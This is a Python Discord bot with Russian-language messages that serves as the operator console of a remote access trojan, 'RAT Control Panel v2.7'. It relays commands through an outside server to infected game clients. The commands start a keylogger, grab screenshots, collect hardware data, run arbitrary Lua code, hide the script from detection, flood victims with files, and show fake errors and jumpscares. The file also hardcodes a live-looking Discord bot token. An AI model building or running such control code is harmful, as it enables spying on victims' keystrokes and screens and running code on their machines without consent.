import discord
from discord.ext import commands
import requests
import base64
import io
import random
import string
from datetime import datetime
import asyncio

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="/", intents=intents, help_command=None)
SERVER_URL = "https://ratserver-6wo3.onrender.com"

@bot.event
async def on_ready():
    print(f"🤖 Бот {bot.user.name} успешно запущен!")
    print(f"📊 Подключено к {len(bot.guilds)} серверам")
    print(f"🌐 Сервер: {SERVER_URL}")
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="RAT Control Panel v2.7"))

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingRole):
        embed = discord.Embed(
            title="❌ Ошибка доступа",
            description="У вас недостаточно прав для выполнения этой команды!",
            color=0xff0000
        )
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(
            title="⚠ Ошибка выполнения",
            description=f"Произошла ошибка: `{str(error)}`",
            color=0xffa500
        )
        await ctx.send(embed=embed)

def send_command(command, args=None):
    """Упрощенная функция отправки команды"""
    try:
        response = requests.post(
            f"{SERVER_URL}/command",
            json={
                "command": command,
                "args": args or []
            },
            timeout=10
        )
        print(f"📨 Отправлена команда {command}, ответ: {response.status_code}")
        return response.status_code == 200
    except Exception as e:
        print(f"❌ Ошибка отправки команды {command}: {e}")
        return False

class BasicCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def test(self, ctx):
        """🧪 Тестовая команда"""
        if send_command("popup", ["Тестовая команда от бота! ✅"]):
            await ctx.send("✅ Тестовая команда отправлена!")
        else:
            await ctx.send("❌ Ошибка отправки команды")

    @commands.command()
    async def print(self, ctx):
        """📡 Проверка связи"""
        if send_command("print"):
            embed = discord.Embed(
                title="📡 Проверка связи",
                description="Команда проверки связи отправлена",
                color=0x00ff00
            )
            await ctx.send(embed=embed)
        else:
            await ctx.send("❌ Ошибка отправки команды")

class ChatCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def chat(self, ctx):
        """💬 Активировать/деактивировать чат"""
        if send_command("chat"):
            embed = discord.Embed(
                title="💬 Управление чатом",
                description="Команда переключения чата отправлена",
                color=0x9b59b6
            )
            await ctx.send(embed=embed)
        else:
            await ctx.send("❌ Ошибка отправки команды")

    @commands.command()
    async def message(self, ctx, *, text: str):
        """📩 Отправить всплывающее сообщение"""
        if len(text) > 100:
            await ctx.send("❌ Сообщение слишком длинное (макс. 100 символов)")
            return
            
        if send_command("popup", [text]):
            embed = discord.Embed(
                title="📩 Сообщение отправлено",
                description=f"```{text}```",
                color=0x3498db
            )
            await ctx.send(embed=embed)
        else:
            await ctx.send("❌ Ошибка отправки сообщения")

class PlayerControl(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def kick(self, ctx, *, reason: str = "Нарушение правил"):
        """🦶 Кикнуть игроков"""
        if send_command("kick", [reason]):
            embed = discord.Embed(
                title="🦶 Игроки кикнуты",
                description=f"**Причина:** {reason}",
                color=0xe74c3c
            )
            await ctx.send(embed=embed)
        else:
            await ctx.send("❌ Ошибка отправки команды")

    @commands.command()
    async def freeze(self, ctx, seconds: int = 5):
        """❄️ Заморозить игроков"""
        if seconds > 60:
            seconds = 60
            await ctx.send("⏰ Время заморозки ограничено 60 секундами")
            
        if send_command("freeze", [seconds]):
            embed = discord.Embed(
                title="❄️ Заморозка активирована",
                description=f"Игроки заморожены на `{seconds}` секунд",
                color=0x3498db
            )
            await ctx.send(embed=embed)
        else:
            await ctx.send("❌ Ошибка отправки команды")

    @commands.command()
    async def void(self, ctx):
        """🌀 Телепортировать в бездну"""
        if send_command("void"):
            embed = discord.Embed(
                title="🌀 Телепорт в бездну",
                description="Игроки телепортированы в бездну",
                color=0x2c3e50
            )
            await ctx.send(embed=embed)
        else:
            await ctx.send("❌ Ошибка отправки команды")

    @commands.command()
    async def spin(self, ctx):
        """🔄 Заставить крутиться"""
        if send_command("spin"):
            embed = discord.Embed(
                title="🔄 Вращение активировано",
                description="Игроки начинают вращаться",
                color=0xf39c12
            )
            await ctx.send(embed=embed)
        else:
            await ctx.send("❌ Ошибка отправки команды")

    @commands.command()
    async def fling(self, ctx):
        """🚀 Подбросить в воздух"""
        if send_command("fling"):
            embed = discord.Embed(
                title="🚀 Подбрасывание",
                description="Игроки подброшены в воздух",
                color=0xe67e22
            )
            await ctx.send(embed=embed)
        else:
            await ctx.send("❌ Ошибка отправки команды")

    @commands.command()
    async def sit(self, ctx):
        """🪑 Заставить сесть/встать"""
        if send_command("sit"):
            embed = discord.Embed(
                title="🪑 Изменение позы",
                description="Игроки меняют позу (сидят/встают)",
                color=0x27ae60
            )
            await ctx.send(embed=embed)
        else:
            await ctx.send("❌ Ошибка отправки команды")

    @commands.command()
    async def dance(self, ctx):
        """💃 Заставить танцевать"""
        if send_command("dance"):
            embed = discord.Embed(
                title="💃 Танец активирован",
                description="Игроки начинают танцевать",
                color=0xe91e63
            )
            await ctx.send(embed=embed)
        else:
            await ctx.send("❌ Ошибка отправки команды")

class AudioVisual(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def mute(self, ctx):
        """🔇 Выключить все звуки"""
        if send_command("mute"):
            embed = discord.Embed(
                title="🔇 Звуки отключены",
                description="Все звуки в игре выключены",
                color=0x95a5a6
            )
            await ctx.send(embed=embed)
        else:
            await ctx.send("❌ Ошибка отправки команды")

    @commands.command()
    async def unmute(self, ctx):
        """🔊 Включить все звуки"""
        if send_command("unmute"):
            embed = discord.Embed(
                title="🔊 Звуки включены",
                description="Все звуки в игре включены",
                color=0x2ecc71
            )
            await ctx.send(embed=embed)
        else:
            await ctx.send("❌ Ошибка отправки команды")

    @commands.command()
    async def playaudio(self, ctx, audio_id: int):
        """🔊 Проиграть звук по ID"""
        if send_command("playaudio", [str(audio_id)]):
            embed = discord.Embed(
                title="🔊 Воспроизведение аудио",
                description=f"Проигрывается аудио с ID: `{audio_id}`",
                color=0x9b59b6
            )
            await ctx.send(embed=embed)
        else:
            await ctx.send("❌ Ошибка отправки команды")

    @commands.command()
    async def blur(self, ctx, seconds: int = 5):
        """🔵 Добавить размытие экрана"""
        if seconds > 30:
            seconds = 30
            await ctx.send("⏰ Время размытия ограничено 30 секундами")
            
        if send_command("blur", [seconds]):
            embed = discord.Embed(
                title="🔵 Размытие экрана",
                description=f"Экран размыт на `{seconds}` секунд",
                color=0x3498db
            )
            await ctx.send(embed=embed)
        else:
            await ctx.send("❌ Ошибка отправки команды")

    @commands.command()
    async def screenshot(self, ctx):
        """🖥️ Получить скриншот"""
        try:
            send_command("screenshot")
            await ctx.send("🖥️ Делаю скриншот... (это может занять несколько секунд)")
            
            await asyncio.sleep(5)
            response = requests.get(f"{SERVER_URL}/screenshot", timeout=30)
            
            if response.status_code == 200:
                data = response.json()
                if data.get('image'):
                    file = discord.File(
                        io.BytesIO(base64.b64decode(data['image'])),
                        filename="screenshot.png"
                    )
                    await ctx.send(content="📸 Скриншот экрана:", file=file)
                else:
                    await ctx.send("❌ Не удалось получить изображение")
            else:
                await ctx.send(f"❌ Ошибка сервера: `{response.status_code}`")
        except Exception as e:
            await ctx.send(f"⚠ Ошибка: `{str(e)}`")

class SystemCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def execute(self, ctx, *, code: str):
        """🔧 Выполнить Lua-код"""
        if len(code) > 500:
            await ctx.send("❌ Код слишком длинный (макс. 500 символов)")
            return
            
        if send_command("execute", [code]):
            embed = discord.Embed(
                title="🔧 Код отправлен",
                description=f"```lua\n{code[:100]}{'...' if len(code) > 100 else ''}\n```",
                color=0xf39c12
            )
            await ctx.send(embed=embed)
        else:
            await ctx.send("❌ Ошибка отправки команды")

    @commands.command()
    async def fakeerror(self, ctx, *, text: str):
        """⚠ Показать фейковую ошибку"""
        if len(text) > 80:
            text = text[:80] + "..."
            
        if send_command("fakeerror", [text]):
            embed = discord.Embed(
                title="⚠ Фейковая ошибка",
                description=f"Сообщение: `{text}`",
                color=0xe74c3c
            )
            await ctx.send(embed=embed)
        else:
            await ctx.send("❌ Ошибка отправки команды")

    @commands.command()
    async def keylog(self, ctx):
        """⌨️ Активировать кейлоггер"""
        if send_command("keylog"):
            embed = discord.Embed(
                title="⌨️ Кейлоггер активирован",
                description="Кейлоггер собирает данные. Логи будут отправляться каждые 5 минут.",
                color=0xe74c3c
            )
            await ctx.send(embed=embed)
        else:
            await ctx.send("❌ Ошибка отправки команды")

    @commands.command()
    async def stopkeylog(self, ctx):
        """🛑 Остановить кейлоггер"""
        if send_command("stopkeylog"):
            embed = discord.Embed(
                title="🛑 Кейлоггер деактивирован",
                description="Сбор данных остановлен. Последние логи отправлены.",
                color=0x2ecc71
            )
            await ctx.send(embed=embed)
        else:
            await ctx.send("❌ Ошибка отправки команды")

class HardwareCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def hardware(self, ctx):
        """🖥️ Получить данные об оборудовании"""
        if send_command("hardware"):
            embed = discord.Embed(
                title="✅ Запрос отправлен",
                description="Данные об оборудовании запрошены",
                color=0x00ff00
            )
            await ctx.send(embed=embed)
        else:
            await ctx.send("❌ Ошибка отправки команды")

    @commands.command()
    async def hide(self, ctx):
        """👻 Скрыть скрипт"""
        if send_command("hide"):
            embed = discord.Embed(
                title="✅ Скрипт скрыт",
                description="Скрипт успешно скрыт от систем обнаружения",
                color=0x00ff00
            )
            await ctx.send(embed=embed)
        else:
            await ctx.send("❌ Ошибка отправки команды")

class SpamCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def memory(self, ctx, file_count: int = 100):
        """💾 Спам файлами в памяти"""
        if file_count > 1000:
            file_count = 1000
            await ctx.send("⚠ Количество файлов ограничено 1000")
            
        embed = discord.Embed(
            title="💾 Запуск Memory Spam",
            description=f"Создание {file_count} файлов...",
            color=0xff6b6b
        )
        message = await ctx.send(embed=embed)

        if send_command("memory_spam", [file_count]):
            embed = discord.Embed(
                title="✅ Memory Spam запущен",
                description=f"Создание {file_count} файлов начато",
                color=0xff6b6b
            )
        else:
            embed = discord.Embed(
                title="❌ Ошибка",
                description="Не удалось отправить команду",
                color=0xff0000
            )
        await message.edit(embed=embed)

    @commands.command()
    async def gallery(self, ctx, file_count: int = 10):
        """🖼️ Спам видео с GitHub"""
        if file_count > 50:
            file_count = 50
            await ctx.send("⚠ Количество файлов ограничено 50")
            
        embed = discord.Embed(
            title="🖼️ Запуск Gallery Spam",
            description=f"Скачивание {file_count} видео с GitHub...",
            color=0x74b9ff
        )
        message = await ctx.send(embed=embed)

        if send_command("gallery_spam", [file_count]):
            embed = discord.Embed(
                title="✅ Gallery Spam запущен",
                description=f"Скачивание {file_count} видео начато\n**Источник:** GitHub",
                color=0x74b9ff
            )
            embed.add_field(name="📁 Файлы", value="Сохраняются в Download/Workspace", inline=False)
            embed.add_field(name="🎥 Контент", value="Видео с GitHub", inline=True)
        else:
            embed = discord.Embed(
                title="❌ Ошибка",
                description="Не удалось отправить команду",
                color=0xff0000
            )
        await message.edit(embed=embed)

class UserCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def users(self, ctx):
        """👥 Показать онлайн пользователей"""
        try:
            response = requests.get(f"{SERVER_URL}/users", timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                users = data.get('users', [])
                count = data.get('count', 0)
                
                if count == 0:
                    embed = discord.Embed(
                        title="👥 Онлайн пользователи",
                        description="❌ Нет активных пользователей\n\n💡 *Пользователи появляются когда они активны в игре и скрипт работает*",
                        color=0xff0000
                    )
                    await ctx.send(embed=embed)
                    return
                
                embed = discord.Embed(
                    title="👥 Онлайн пользователи",
                    description=f"**Всего пользователей:** {count}",
                    color=0x00ff00,
                    timestamp=datetime.now()
                )
                
                games = {}
                for user in users:
                    game_name = user.get('place', 'Unknown')
                    if game_name not in games:
                        games[game_name] = []
                    games[game_name].append(user)
                
                for game_name, game_users in games.items():
                    user_list = []
                    for user in game_users:
                        player_name = user.get('player', 'Unknown')
                        executor = user.get('executor', 'Unknown')
                        last_seen = user.get('timestamp', '').split('T')[1][:8] if user.get('timestamp') else 'N/A'
                        
                        user_list.append(f"`{player_name}` ({executor}) - {last_seen}")
                    
                    embed.add_field(
                        name=f"🎮 {game_name} ({len(game_users)})",
                        value="\n".join(user_list[:8]) + ("\n..." if len(user_list) > 8 else ""),
                        inline=False
                    )
                
                embed.set_footer(text=f"🔄 Данные обновлены • {datetime.now().strftime('%H:%M:%S')}")
                await ctx.send(embed=embed)
                
            else:
                embed = discord.Embed(
                    title="❌ Ошибка",
                    description="Не удалось получить список пользователей",
                    color=0xff0000
                )
                await ctx.send(embed=embed)
                
        except Exception as e:
            embed = discord.Embed(
                title="❌ Ошибка",
                description=f"Ошибка при получении данных: `{str(e)}`",
                color=0xff0000
            )
            await ctx.send(embed=embed)

class JumpscareCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def jumpscare(self, ctx, scare_type: int = 1):
        """👻 Запустить скример (1-Джефф Килер, 2-Соник.exe)"""
        scare_names = {
            1: "Джефф Килер 👹",
            2: "Соник.exe 💀"
        }
        
        name = scare_names.get(scare_type, "Джефф Килер")
        
        if send_command("jumpscare", [scare_type]):
            embed = discord.Embed(
                title=f"👻 Скример {name} запущен!",
                description="**Тайминг:**\n1. 2 сек - звук предупреждения\n2. 3 сек - пауза\n3. ⚡ СКРИМЕР!\n\n⚠️ Приготовься к ужасу!",
                color=0xff0000
            )
            embed.add_field(name="🎭 Тип", value=name, inline=True)
            embed.add_field(name="🕒 Длительность", value="~10 секунд", inline=True)
            embed.set_footer(text="Полноэкранный режим активирован")
            await ctx.send(embed=embed)
        else:
            await ctx.send("❌ Ошибка отправки команды")

class Utility(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="help")
    async def help_command(self, ctx):
        """📜 Показать список всех команд"""
        embed = discord.Embed(
            title="🤖 RAT Control Panel v2.7",
            description="Полный список доступных команд для управления клиентами",
            color=0x7289da,
            timestamp=datetime.now()
        )
        
        categories = [
            ("🧪 Основные команды", [
                ("`/test`", "Тестовая команда"),
                ("`/print`", "Проверка связи")
            ]),
            ("💬 Чат команды", [
                ("`/chat`", "Активировать/деактивировать чат"),
                ("`/message <текст>`", "Отправить всплывающее сообщение")
            ]),
            ("👤 Управление игроком", [
                ("`/kick <причина>`", "Кикнуть игроков"),
                ("`/freeze <секунды>`", "Заморозить игроков"),
                ("`/void`", "Телепорт в бездну"),
                ("`/spin`", "Крутить игроков"),
                ("`/fling`", "Подбросить игроков"),
                ("`/sit`", "Сидеть/встать"),
                ("`/dance`", "Танцевать")
            ]),
            ("🔊 Аудио/Видео", [
                ("`/mute`", "Выключить звуки"),
                ("`/unmute`", "Включить звуки"),
                ("`/playaudio <id>`", "Проиграть звук"),
                ("`/blur <секунды>`", "Размытие экрана"),
                ("`/screenshot`", "Скриншот экрана")
            ]),
            ("⚙️ Системные команды", [
                ("`/execute <код>`", "Выполнить Lua-код"),
                ("`/fakeerror <текст>`", "Показать фейковую ошибку"),
                ("`/keylog`", "Активировать кейлоггер"),
                ("`/stopkeylog`", "Остановить кейлоггер")
            ]),
            ("🖥️ Оборудование", [
                ("`/hardware`", "Данные об оборудовании"),
                ("`/hide`", "Скрыть скрипт")
            ]),
            ("👥 Пользователи", [
                ("`/users`", "Показать онлайн пользователей")
            ]),
            ("👻 Скримеры", [
                ("`/jumpscare <тип>`", "Запустить скример (1-Джефф, 2-Соник)")
            ]),
            ("💥 Spam команды", [
                ("`/memory <кол-во>`", "Спам файлами в памяти"),
                ("`/gallery <кол-во>`", "Спам видео с GitHub")
            ])
        ]

        for category, commands in categories:
            command_list = "\n".join(f"{cmd} - {desc}" for cmd, desc in commands)
            embed.add_field(
                name=category,
                value=command_list,
                inline=False
            )

        embed.add_field(
            name="ℹ️ Информация",
            value=f"• Сервер: `{SERVER_URL}`\n• Всего команд: `{sum(len(cmds) for _, cmds in categories)}`\n• Бот: `{bot.user.name}`\n• Обновление данных: `15 секунд`",
            inline=False
        )
        
        embed.set_footer(text=f"Запросил: {ctx.author.display_name} | /help")
        await ctx.send(embed=embed)

    @commands.command(name="status")
    async def status_command(self, ctx):
        """📊 Показать статус системы"""
        try:
            response = requests.get(f"{SERVER_URL}/status", timeout=5)
            if response.status_code == 200:
                data = response.json()
                pending_commands = data.get('pending_commands', 0)
                online_users = data.get('online_users', 0)
                
                embed = discord.Embed(
                    title="📊 Статус системы",
                    description="Текущее состояние RAT Control System",
                    color=0x7289da,
                    timestamp=datetime.now()
                )
                
                embed.add_field(name="🤖 Бот", value="🟢 Активен", inline=True)
                embed.add_field(name="🌐 Сервер", value="🟢 Активен", inline=True)
                embed.add_field(name="📨 Команды", value=f"`{pending_commands}` в очереди", inline=True)
                embed.add_field(name="👥 Пользователи", value=f"`{online_users}` онлайн", inline=True)
                
                embed.add_field(
                    name="🛠️ Техническая информация",
                    value=f"• Версия: `2.7.0`\n• Сервер: `{SERVER_URL}`\n• Обновление: `15 секунд`\n• Скримеры: `2 типа`\n• Время: `{datetime.now().strftime('%H:%M:%S')}`",
                    inline=False
                )
            else:
                embed = discord.Embed(
                    title="📊 Статус системы",
                    description="Не удалось получить статус сервера",
                    color=0xff0000
                )
        except Exception as e:
            embed = discord.Embed(
                title="📊 Статус системы",
                description=f"Ошибка подключения: `{str(e)}`",
                color=0xff0000
            )
        
        embed.set_footer(text=f"Запросил: {ctx.author.display_name}")
        await ctx.send(embed=embed)

async def main():
    async with bot:
        await bot.add_cog(BasicCommands(bot))
        await bot.add_cog(ChatCommands(bot))
        await bot.add_cog(PlayerControl(bot))
        await bot.add_cog(AudioVisual(bot))
        await bot.add_cog(SystemCommands(bot))
        await bot.add_cog(HardwareCommands(bot))
        await bot.add_cog(SpamCommands(bot))
        await bot.add_cog(UserCommands(bot))
        await bot.add_cog(JumpscareCommands(bot))
        await bot.add_cog(Utility(bot))
        await bot.start("MTM5Nzk4NTQyODM4NDI1NjAwMA.GHeP85.k2qv2aPdZQTLCnZAMh1JgWtxrpLTnBAZ8sdSRA")

asyncio.run(main())